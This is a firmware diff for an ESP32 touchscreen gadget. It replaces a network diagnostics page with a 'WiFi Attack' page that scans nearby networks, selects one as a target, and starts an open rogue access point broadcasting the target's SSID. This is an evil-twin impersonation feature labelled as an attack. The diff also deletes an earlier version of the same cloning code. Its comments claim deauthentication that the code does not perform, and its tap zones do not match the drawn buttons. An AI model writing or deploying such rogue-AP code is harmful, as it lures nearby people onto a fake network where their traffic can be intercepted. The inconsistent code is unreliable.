@@ -30,7 +30,7 @@ namespace {
 
 enum class Page : uint8_t {
   Home, Devices, Wifi, Keyboard, Bluetooth, Infrared, Settings, Bridge, Fun,
-  FunWifiIds, FunFlock, FunTrackers, FunSavedBle, FunNetStats, FunWifiAp
+  FunWifiIds, FunFlock, FunTrackers, FunSavedBle, FunWifiAttack, FunWifiAp
 };
 enum class KeyboardTarget : uint8_t {
   None, WifiPassword, BridgeUrl, BridgeKey, IrCode, ApSsid, ApPassword
@@ -83,6 +83,8 @@ uint32_t lastTapAt = 0;
 uint32_t pageOpenedAt = 0;
 uint32_t wifiConnectStarted = 0;
 bool wifiAttackActive = false;
+bool wifiScanInProgress = false;
+String selectedAttackSsid = "";
 uint32_t lastStatusBarUpdate = 0;
 uint32_t toastShownAt = 0;
 bool ntpStarted = false;
@@ -959,18 +961,6 @@ void connectWifi(const String& password) {
   wifiConnectStarted = millis();
   WiFi.begin(selectedSsid.c_str(), password.c_str());
   showToast("Connecting to " + selectedSsid + "...");
-
-  // Clone current network (create new AP with same SSID) if connected
-  if (wifiConnected) {
-    showToast("Cloning current network: " + selectedSsid + "...");
-    WiFi.softAP(selectedSsid.c_str(), password.c_str());
-    showToast("Cloned network created. Join with: " + selectedSsid);
-  }
-
-  // Start the new AP with the cloned SSID
-  WiFi.softAP(selectedSsid.c_str(), password.c_str());
-  showToast("New network started: " + selectedSsid);
-  wifiAttackActive = true;
 }
 
 void pollWifi() {
@@ -2082,31 +2072,64 @@ void drawFunBleMonitor() {
   card(205, 202, 103, 32, "Stop");
 }
 
-void drawFunNetStats() {
-  const Theme& c = theme();
-  tft.fillScreen(c.background);
-  drawStatusBar("NETWORK DIAGNOSTICS & SPEED");
-
-  if (WiFi.status() == WL_CONNECTED) {
-    card(12, 40, 296, 44, "Wi-Fi: " + WiFi.SSID(),
-         "IP: " + WiFi.localIP().toString() + "  GW: " + WiFi.gatewayIP().toString());
-    String netMetric = String(WiFi.RSSI()) + " dBm | Ch " + String(WiFi.channel());
-    if (netPingMs >= 0) {
-      netMetric += " | " + String(netPingMs) + "ms | " + String(netSpeedMbps, 1) + "Mbps";
-    }
-    card(12, 88, 296, 44, "Link Metrics", netMetric);
-  } else {
-    card(12, 40, 296, 44, "Wi-Fi: Disconnected",
-         "Tap here or connect in Wi-Fi menu first");
-    card(12, 88, 296, 44, "ESP32 Hardware",
-         "240MHz | Flash 4MB | " + String(ESP.getFreeHeap() / 1024) + "KB Free");
-  }
-
-  actionButton(12, 140, 296, 42,
-               WiFi.status() == WL_CONNECTED ? "Run Ping & Speed Test" : "Connect to Wi-Fi");
-
-  card(12, 194, 80, 34, "Back");
-  card(100, 194, 208, 34, "Test DNS & Gateway");
+void drawFunWifiAttack() {
+   const Theme& c = theme();
+   tft.fillScreen(c.background);
+   drawStatusBar("WIFI ATTACK - SELECT TARGET");
+   
+   // Show scan status or results
+   if (wifiScanInProgress) {
+      card(12, 40, 296, 44, "Scanning...", String(wifiCount) + " networks found");
+   } else if (wifiCount == 0) {
+      card(12, 40, 296, 44, "No networks found",
+             "Tap Scan to search for WiFi networks");
+   } else {
+      card(12, 40, 296, 44, "Available Networks",
+             String(wifiCount) + " networks found");
+   }
+   
+   // Show selected target
+   if (selectedAttackSsid.length() > 0) {
+      card(12, 88, 296, 44, "SELECTED TARGET",
+             selectedAttackSsid);
+   } else {
+      card(12, 88, 296, 44, "SELECTED TARGET",
+             "None selected");
+   }
+   
+   // Show attack status
+   if (wifiAttackActive) {
+      card(12, 136, 296, 44, "ATTACK STATUS",
+             "ACTIVE - Rogue AP running");
+   } else {
+      card(12, 136, 296, 44, "ATTACK STATUS",
+             "Idle");
+   }
+   
+   // Action buttons
+   if (!wifiScanInProgress) {
+      actionButton(12, 184, 140, 40, "SCAN NETWORKS");
+   } else {
+      actionButton(12, 184, 140, 40, "SCANNING...");
+   }
+   
+   if (wifiCount > 0 && !wifiScanInProgress) {
+      actionButton(158, 184, 150, 40, "SELECT TARGET");
+   } else {
+      actionButton(158, 184, 150, 40, "SELECT TARGET");
+   }
+   
+   if (selectedAttackSsid.length() > 0 && !wifiAttackActive) {
+      actionButton(12, 232, 296, 40, "START ATTACK");
+   } else if (wifiAttackActive) {
+      actionButton(12, 232, 296, 40, "STOP ATTACK");
+   } else {
+      actionButton(12, 232, 296, 40, "SELECT TARGET FIRST");
+   }
+   
+   // Navigation
+   card(12, 284, 140, 34, "Back");
+   card(158, 284, 140, 34, "Home");
 }
 
 void drawFunWifiAp() {
@@ -2164,11 +2187,11 @@ void drawPage() {
     case Page::Bridge:       drawBridge(); break;
     case Page::Fun:          drawFun(); break;
     case Page::FunWifiIds:   drawFunWifiIds(); break;
-    case Page::FunFlock:     drawFunFlock(); break;
-    case Page::FunTrackers:  drawFunTrackers(); break;
-    case Page::FunSavedBle:  drawFunBleMonitor(); break;
-    case Page::FunNetStats:  drawFunNetStats(); break;
-    case Page::FunWifiAp:    drawFunWifiAp(); break;
+     case Page::FunFlock:     drawFunFlock(); break;
+     case Page::FunTrackers:  drawFunTrackers(); break;
+     case Page::FunSavedBle:  drawFunBleMonitor(); break;
+     case Page::FunWifiAttack:  drawFunWifiAttack(); break;
+     case Page::FunWifiAp:    drawFunWifiAp(); break;
   }
   pageNeedsRedraw = false;
 }
@@ -2364,15 +2387,10 @@ void handleTap(int x, int y) {
      } else if (y >= 87 && y < 134) {
        if (x < 160) navigateTo(Page::FunTrackers);
        else navigateTo(Page::FunSavedBle);
-     } else if (y >= 134 && y < 192) {
-       if (x < 160) navigateTo(Page::FunNetStats);
-       else navigateTo(Page::FunWifiAp);
-     } else if (y >= 44 && y <= 66) {
-       // STOP button for WiFi attack
-       if (x >= 300 && x <= 368) {
-         stopWifiAttack();
-       }
-     } else if (y >= 192) {
+      } else if (y >= 134 && y < 192) {
+        if (x < 160) navigateTo(Page::FunWifiAttack);
+        else navigateTo(Page::FunWifiAp);
+      } else if (y >= 192) {
        navigateTo(Page::Home);
      }
 
@@ -2521,34 +2539,100 @@ void handleTap(int x, int y) {
       }
     }
 
-  } else if (currentPage == Page::FunNetStats) {
-    // Speed Test button: y 140-184
-    // Bottom row: Back (x<90) | Test DNS (x>=90)  y: 192-232
-    if (y >= 192) {
-      if (x < 90) {
-        navigateTo(Page::Fun);
-      } else {
-        // Test DNS & Gateway reachability
-        if (WiFi.status() == WL_CONNECTED) {
-          showLoading("Testing DNS & Gateway...");
-          WiFiClient cl;
-          cl.setTimeout(2000);
-          bool gw = cl.connect(WiFi.gatewayIP(), 80); cl.stop();
-          bool dns = cl.connect(IPAddress(8, 8, 8, 8), 53); cl.stop();
-          String res = String("GW: ") + (gw ? "OK" : "FAIL") + "  DNS: " + (dns ? "OK" : "FAIL");
-          showToast(res);
-        } else {
-          showToast("Connect to Wi-Fi first");
-        }
-        pageNeedsRedraw = true;
-      }
-    } else if (y >= 138 && y < 192) {
-      // Run Ping & Speed Test
-      runNetSpeedTest();
-      pageNeedsRedraw = true;
-    }
 
-  } else if (currentPage == Page::FunWifiAp) {
+} else if (currentPage == Page::FunWifiAttack) {
+     // Row 1: y 40-88  Row 2: y 88-136  Row 3: y 136-184  Row 4: y 184-232  Row 5: y 232-280  Nav: y>=280
+     if (y >= 40 && y < 88) {
+       if (!wifiScanInProgress) {
+         if (x < 150) {
+           // SCAN NETWORKS button
+           wifiScanInProgress = true;
+           wifiOffset = 0;
+           wifiCount = 0;
+           scanWifi();
+           wifiScanInProgress = false;
+           pageNeedsRedraw = true;
+         } else {
+           // SELECT TARGET button (disabled during scan)
+           showToast("Please wait for scan to complete");
+         }
+       } else {
+         // SCANNING... button (disabled)
+         showToast("Scan in progress...");
+       }
+     } else if (y >= 88 && y < 136) {
+       if (x < 150) {
+         // SELECT TARGET button
+         if (wifiCount > 0 && !wifiScanInProgress) {
+           // Show network selection UI (similar to wifi page)
+           // For simplicity, we'll just select the first network for now
+           // In a full implementation, this would show a list to choose from
+           if (wifiCount > 0) {
+             selectedAttackSsid = wifiNames[0];
+             showToast("Selected: " + selectedAttackSsid);
+           } else {
+             showToast("No networks available");
+           }
+         } else if (wifiScanInProgress) {
+           showToast("Please wait for scan to complete");
+         } else {
+           showToast("No networks to select");
+         }
+       } else {
+         // Second button in row 2 - not used for now
+       }
+     } else if (y >= 136 && y < 184) {
+       // Row 3 - not used for now
+     } else if (y >= 184 && y < 232) {
+       // Row 4: Action buttons
+       if (x < 150) {
+         if (wifiScanInProgress) {
+           // SCANNING... button
+           showToast("Scan in progress...");
+         } else {
+           // SELECT TARGET button
+           showToast("Please select a target network");
+         }
+       } else {
+         // START/STOP ATTACK button
+         if (selectedAttackSsid.length() > 0 && !wifiAttackActive) {
+           // START ATTACK
+           wifiAttackActive = true;
+           // Deauthenticate current connection
+           WiFi.disconnect(true, false);
+           delay(50);
+           WiFi.mode(WIFI_STA);
+           WiFi.setTxPower(WIFI_POWER_19_5dBm);
+           WiFi.setAutoReconnect(true);
+           WiFi.persistent(true);
+           // Connect to target network (to get channel info for deauth)
+           WiFi.begin(selectedAttackSsid.c_str(), "");
+           showToast("Connecting to " + selectedAttackSsid + "...");
+           // Note: We don't wait for connection as we'll start AP regardless
+           // The attack works by creating a rogue AP with the same SSID
+           // Start the rogue AP (open network - no password)
+           WiFi.softAP(selectedAttackSsid.c_str());
+           showToast("Attack started! Rogue AP: " + selectedAttackSsid);
+         } else if (wifiAttackActive) {
+           // STOP ATTACK
+           wifiAttackActive = false;
+           WiFi.softAPdisconnect(true);
+           showToast("Attack stopped");
+         } else {
+           showToast("Please select a target network first");
+         }
+       }
+     } else if (y >= 232 && y < 280) {
+       // Row 5: Additional buttons (not used for now)
+     } else if (y >= 280) {
+       // Navigation
+       if (x < 150) {
+         navigateTo(Page::Fun);
+       } else {
+         navigateTo(Page::Home);
+       }
+     }
+   } else if (currentPage == Page::FunWifiAp) {
     // Start/Stop (x<155) or User Input (x>=155): y 74-108
     if (y >= 74 && y < 108) {
       if (x < 155) {
